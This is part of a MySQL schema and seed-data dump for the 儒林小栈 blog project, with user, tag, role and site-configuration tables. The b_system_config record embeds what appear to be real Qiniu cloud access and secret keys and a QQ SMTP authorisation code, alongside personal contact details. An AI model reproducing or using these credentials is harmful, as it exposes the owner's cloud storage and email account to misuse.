INSERT INTO `b_role_menu` VALUES (12334, 1, 237, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12335, 1, 238, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12336, 1, 239, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12337, 1, 241, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12338, 1, 242, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12339, 1, 243, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12340, 1, 244, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12341, 1, 272, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12342, 1, 273, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12343, 1, 275, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12344, 1, 276, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12345, 1, 277, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12346, 1, 278, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12347, 1, 279, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12348, 1, 280, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12349, 1, 281, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12350, 1, 289, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12351, 1, 274, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12352, 1, 282, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12353, 1, 283, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12354, 1, 284, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12355, 1, 285, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12356, 1, 286, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12357, 1, 287, '2023-04-13 20:09:58', '2023-04-13 20:09:58');
INSERT INTO `b_role_menu` VALUES (12358, 1, 288, '2023-04-13 20:09:58', '2023-04-13 20:09:58');

-- ----------------------------
-- Table structure for b_system_config
-- ----------------------------
DROP TABLE IF EXISTS `b_system_config`;
CREATE TABLE `b_system_config`  (
  `id` bigint(32) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `qi_niu_access_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '七牛云公钥',
  `qi_niu_secret_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '七牛云私钥',
  `qi_niu_area` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '七牛云存储区域 华东（z0），华北(z1)，华南(z2)，北美(na0)，东南亚(as0)',
  `qi_niu_bucket` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '七牛云上传空间',
  `qi_niu_picture_base_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '七牛云域名前缀：http://images.moguit.cn',
  `upload_qi_niu` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文件上传七牛云(0:否， 1:是)',
  `open_email_activate` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '是否开启注册用户邮件激活(0:否， 1:是)',
  `start_email_notification` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否开启邮件通知(0:否， 1:是)',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '更新时间',
  `open_dashboard_notification` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否开启仪表盘通知(0:否， 1:是)',
  `dashboard_notification_md` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '仪表盘通知【用于首次登录弹框】MD',
  `dashboard_notification` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '仪表盘通知【用于首次登录弹框】',
  `search_model` int(1) NOT NULL DEFAULT 0 COMMENT '搜索模式【0:SQL搜索 、1：全文检索】',
  `email_host` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱地址',
  `email_username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱发件人',
  `email_password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱授权码',
  `email_port` int(10) NULL DEFAULT NULL COMMENT '邮箱发送端口',
  `open_email` int(1) NULL DEFAULT NULL COMMENT '启用邮箱发送',
  `local_file_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '本地文件地址',
  `file_upload_way` int(1) NULL DEFAULT NULL COMMENT '文件上传方式 1:本地 2：七牛云',
  `ali_yun_access_key` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '阿里云ak',
  `ali_yun_secret_key` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '阿里云sk',
  `ali_yun_bucket` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '阿里云存储桶名',
  `ali_yun_endpoint` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '阿里云Endpoint',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统配置表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_system_config
-- ----------------------------
INSERT INTO `b_system_config` VALUES (1, 'p5XfIW_5COB3-I5M_JqsLFnOIBa4F9HLAlCKiUyD', 'DCXEQeZBmnBOTeYF7P9XHEh3OHioawGv4TLjjHYg', 'z1', 'p--blog', 'http://img.codescholar.cn/', '1', '1', '1', '2023-04-20 15:41:36', '2023-04-20 15:41:36', '1', '欢迎来到儒林小栈项目，开源项目离不开大家的支持，希望小伙伴能随手点赞一下，你的点赞就是我维护的动力~\n\n项目根据我自己的喜好进行开发，大家可以根据自己的使用场景自行更改。\n\n项目源码：[点我传送](https://gitee.com/chengxuru/rulin-blog)，项目官网：[点我传送](http://www.codescholar.cn)\n\n项目还在开发阶段，如有不善的地方欢迎各位小伙伴多多反馈\n\n最低配置：1核2G \n\n推荐配置：2核4G \n\n服务器和域名等服务的购买和续费都会产生一定的费用，为了维持项目的正常运作，如果觉得本项目对您有帮助的话\n\n欢迎朋友能够给予一些支持，非常感谢~（ps.. 小伙伴赞赏的时候可以备注一下下~）\n|支付宝||微信|\n|-|-|-|\n|![支付宝](http://img.codescholar.cn/webconfig/Alipay.jpg)||![微信](http://img.codescholar.cn/webconfig/wechatPay.jpg)|', '<p>欢迎来到儒林小栈项目，开源项目离不开大家的支持，希望小伙伴能随手点赞一下，你的点赞就是我维护的动力~</p>\n<p>项目根据我自己的喜好进行开发，大家可以根据自己的使用场景自行更改。</p>\n<p>项目源码：<a href=\"https://gitee.com/chengxuru/rulin-blog\" target=\"_blank\">点我传送</a>，项目官网：<a href=\"http://www.codescholar.cn\" target=\"_blank\">点我传送</a></p>\n<p>项目还在开发阶段，如有不善的地方欢迎各位小伙伴多多反馈</p>\n<p>最低配置：1核2G</p>\n<p>推荐配置：2核4G</p>\n<p>服务器和域名等服务的购买和续费都会产生一定的费用，为了维持项目的正常运作，如果觉得本项目对您有帮助的话</p>\n<p>欢迎朋友能够给予一些支持，非常感谢~（ps… 小伙伴赞赏的时候可以备注一下下~）</p>\n<table>\n<thead>\n<tr>\n<th>支付宝</th>\n<th></th>\n<th>微信</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><img src=\"http://img.codescholar.cn/webconfig/Alipay.jpg\" alt=\"支付宝\" /></td>\n<td></td>\n<td><img src=\"http://img.codescholar.cn/webconfig/wechatPay.jpg\" alt=\"微信\" /></td>\n</tr>\n</tbody>\n</table>\n', 0, 'smtp.qq.com', '1055826438@qq.com', 'hewufelzwwudbede', 587, 1, '', 1, NULL, NULL, NULL, NULL);

-- ----------------------------
-- Table structure for b_tags
-- ----------------------------
DROP TABLE IF EXISTS `b_tags`;
CREATE TABLE `b_tags`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '标签名称',
  `click_volume` int(10) NULL DEFAULT 0,
  `sort` int(11) NOT NULL COMMENT '排序',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '最后更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `tag_name`(`name`) USING BTREE COMMENT '博客标签名称'
) ENGINE = InnoDB AUTO_INCREMENT = 17 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '博客标签表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_tags
-- ----------------------------
INSERT INTO `b_tags` VALUES (1, 'springboot', 1, 1, '2023-04-20 14:43:27', '2022-04-15 03:00:00');
INSERT INTO `b_tags` VALUES (2, 'elasticsearch', 1, 2, '2023-04-20 14:43:27', '2023-04-09 18:55:32');
INSERT INTO `b_tags` VALUES (3, 'blog', 1, 3, '2023-04-20 14:43:27', '2022-04-15 03:00:00');
INSERT INTO `b_tags` VALUES (4, 'vue', 0, 4, '2023-04-20 14:01:50', '2023-04-08 18:29:43');
INSERT INTO `b_tags` VALUES (5, 'springcloud', 0, 5, '2023-04-20 14:02:32', '2023-04-09 18:55:49');
INSERT INTO `b_tags` VALUES (6, 'webmagic', 0, 6, '2023-04-20 17:09:12', '2023-04-09 18:55:18');
INSERT INTO `b_tags` VALUES (7, 'markdown', 0, 7, '2023-04-20 06:04:17', '2022-01-14 06:04:17');
INSERT INTO `b_tags` VALUES (8, 'redis', 1, 8, '2023-04-20 14:09:03', '2022-04-15 03:00:00');
INSERT INTO `b_tags` VALUES (9, 'linux', 1, 9, '2023-04-20 14:09:17', '2022-04-15 03:00:00');
INSERT INTO `b_tags` VALUES (10, 'IDEA', 0, 10, '2023-04-20 15:12:49', '2022-02-15 07:12:48');
INSERT INTO `b_tags` VALUES (11, 'mysql', 1, 11, '2023-04-20 16:01:07', '2022-04-15 03:00:00');
INSERT INTO `b_tags` VALUES (12, 'nginx', 0, 12, '2023-04-20 17:48:08', '2022-04-13 09:48:08');
INSERT INTO `b_tags` VALUES (13, '测试', 0, 13, '2023-04-20 18:35:30', '2023-04-09 18:55:07');
INSERT INTO `b_tags` VALUES (14, 'spring框架', 0, 14, '2023-04-20 19:21:38', '2023-04-11 19:21:38');
INSERT INTO `b_tags` VALUES (15, 'dubbo', 0, 15, '2023-04-20 19:21:38', '2023-04-11 19:21:38');
INSERT INTO `b_tags` VALUES (16, '触发器', 0, 16, '2023-04-20 19:21:38', '2023-04-11 19:21:38');

-- ----------------------------
-- Table structure for b_user
-- ----------------------------
DROP TABLE IF EXISTS `b_user`;
CREATE TABLE `b_user`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '账号',
  `password` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录密码',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `status` int(10) NULL DEFAULT 1 COMMENT '状态 0:禁用 1:正常',
  `login_type` int(10) NULL DEFAULT NULL COMMENT '登录方式',
  `user_auth_id` bigint(10) NULL DEFAULT NULL COMMENT '用户详情id',
  `role_id` bigint(20) NULL DEFAULT NULL COMMENT '角色id',
  `ip_address` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'ip地址',
  `ip_source` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'ip来源',
  `os` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录系统',
  `last_login_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '最后登录时间',
  `browser` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '浏览器',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `username`(`username`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 16 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统管理-用户基础信息表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_user
-- ----------------------------
INSERT INTO `b_user` VALUES (7, 'admin', '5oKL7Cqx7AxKEAfOB+Ocwg==', '2021-09-27 15:43:45', '2022-03-10 17:59:40', 1, 1, 1, 1, '127.0.0.1', '内网IP|内网IP', 'Windows 10', '2023-04-18 20:38:10', 'Chrome 11');
INSERT INTO `b_user` VALUES (15, 'test', '5oKL7Cqx7AxKEAfOB+Ocwg==', '2021-11-14 12:35:03', '2022-03-10 14:11:02', 1, 1, 2, 5, '183.94.151.29', '中国-湖北省-武汉市', 'Linux', '2022-04-15 01:20:39', 'Chrome 10');

-- ----------------------------
-- Table structure for b_user_auth
-- ----------------------------
DROP TABLE IF EXISTS `b_user_auth`;
CREATE TABLE `b_user_auth`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `email` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱号',
  `nickname` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户昵称',
  `avatar` varchar(1024) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户头像',
  `intro` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '用户简介',
  `web_site` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '个人网站',
  `is_disable` int(1) NOT NULL DEFAULT 1 COMMENT '是否禁用',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户信息表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_user_auth
-- ----------------------------
INSERT INTO `b_user_auth` VALUES (1, 'admin', '管理员', 'http://img.codescholar.cn/9a0a3a57c52d409f8a1f9fe5b27077d2.jpg', NULL, NULL, 1, NULL, NULL);
INSERT INTO `b_user_auth` VALUES (2, 'test', '演示账号', 'http://img.codescholar.cn/2016041910154740326.jpg', NULL, NULL, 1, NULL, NULL);

-- ----------------------------
-- Table structure for b_user_log
-- ----------------------------
DROP TABLE IF EXISTS `b_user_log`;
CREATE TABLE `b_user_log`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '操作用户ID',
  `ip` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'ip地址',
  `address` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作地址',
  `type` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作类型',
  `description` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作日志',
  `model` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作模块',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '操作时间',
  `result` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作结果',
  `access_os` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '浏览器',
  `client_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '客户端类型',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '日志表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_user_log
-- ----------------------------

-- ----------------------------
-- Table structure for b_user_role
-- ----------------------------
DROP TABLE IF EXISTS `b_user_role`;
CREATE TABLE `b_user_role`  (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `role_id` int(10) NULL DEFAULT NULL COMMENT '角色ID',
  `user_id` int(10) NULL DEFAULT NULL COMMENT '用户ID',
  `created_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `last_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 35 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统管理 - 用户角色关联表 ' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_user_role
-- ----------------------------
INSERT INTO `b_user_role` VALUES (12, 1, 7, '2023-04-20 10:49:41', '2023-04-20 10:49:41');
INSERT INTO `b_user_role` VALUES (34, 5, 15, '2023-04-20 12:35:03', '2023-04-20 12:35:03');

-- ----------------------------
-- Table structure for b_web_config
-- ----------------------------
DROP TABLE IF EXISTS `b_web_config`;
CREATE TABLE `b_web_config`  (
  `id` bigint(32) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `logo` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'logo(文件UID)',
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '网站名称',
  `summary` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '介绍',
  `keyword` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '关键字',
  `author` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '作者',
  `record_num` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '备案号',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '更新时间',
  `web_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '网站地址',
  `ali_pay` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝收款码FileId',
  `weixin_pay` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信收款码FileId',
  `github` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'github地址',
  `gitee` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'gitee地址',
  `qq_number` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'QQ号',
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `show_list` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '显示的列表（用于控制邮箱、QQ、QQ群、Github、Gitee、微信是否显示在前端）',
  `login_type_list` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '登录方式列表（用于控制前端登录方式，如账号密码,码云,Github,QQ,微信）',
  `open_comment` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '1' COMMENT '是否开启评论(0:否 1:是)',
  `open_admiration` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否开启赞赏(0:否， 1:是)',
  `tourist_avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '游客头像',
  `bulletin` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公告',
  `author_info` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者简介',
  `author_avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者头像',
  `about_me` mediumtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '关于我',
  `is_music_player` int(10) NULL DEFAULT 0 COMMENT '是否开启音乐播放器',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '网站配置表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_web_config
-- ----------------------------
INSERT INTO `b_web_config` VALUES (1, 'http://img.codescholar.cn/9a0a3a57c52d409f8a1f9fe5b27077d2.jpg', '儒林小栈', '言念君子，温其如玉', '程序儒,儒林小栈', 'CodeScholar', '冀ICP备17023171号', '2021-11-27 13:43:16', '2022-01-20 13:30:44', 'http://www.codescholar.cn', 'http://img.codescholar.cn/76989852110f4852ac52259f7f913a5e.jpg', 'http://img.codescholar.cn/b293194849284cc2acc6c067792d4cb5.jpg', 'https://github.com/i-Dreamer', 'https://gitee.com/chengxuru', '1055826438', '1055826438@qq.com', '1,2,3,4', '1', '1', 1, 'http://img.codescholar.cn/7820123778294183b0e9a38d667b4e18.png', '如入你眼，请上码云给仓库点上您的小星星', '言念君子，温其如玉', 'http://img.codescholar.cn/9a0a3a57c52d409f8a1f9fe5b27077d2.jpg', '> 特别鸣谢博客作者：风丶宇  ([gitee仓库](https://gitee.com/feng_meiyu/blog)内容已下架)\n\n# \n\n#### 这是一个梦开始的地方~\n\n#### 2020年\n\n#### 我从我的一个梦中\n\n#### 走进了现实\n\n#### 梦很美好\n\n#### 现实很残酷\n\n#### 花径不曾缘客扫，蓬门今始为君开\n\n#### 我是程序儒\n\n#### 95后\n\n#### 爱编程、爱电子、爱读书、爱折腾\n\n#### 。。。。。\n\n#### 我会在这里分享一些自己的经历和学习笔记\n\n#### 希望可以帮到你\n\n#### 也欢迎你来和我一起交流\n\n#### 在岁月中跋涉，每个人都有自己的故事\n\n#### 看淡心境才会秀丽，看开心情才会明媚\n\n#### 累时歇一歇\n\n#### 随清风漫舞\n\n#### 烦时静一静\n\n#### 与花草凝眸\n\n#### 急时缓一缓\n\n#### 和自己微笑\n\n#### 愿你我终究平凡不平庸\n\n# \n\n### 这是我的博客源码，前端用的vue，后端用的springboot，欢迎骚扰\n\n[![buzhiming/儒林小栈](https://gitee.com/chengxuru/rulin-blog/widgets/widget_card.svg?colors=4183c4,ffffff,ffffff,e3e9ed,666666,9b9b9b)](https://gitee.com/chengxuru/rulin-blog)\n\n', 1);

SET FOREIGN_KEY_CHECKS = 1;
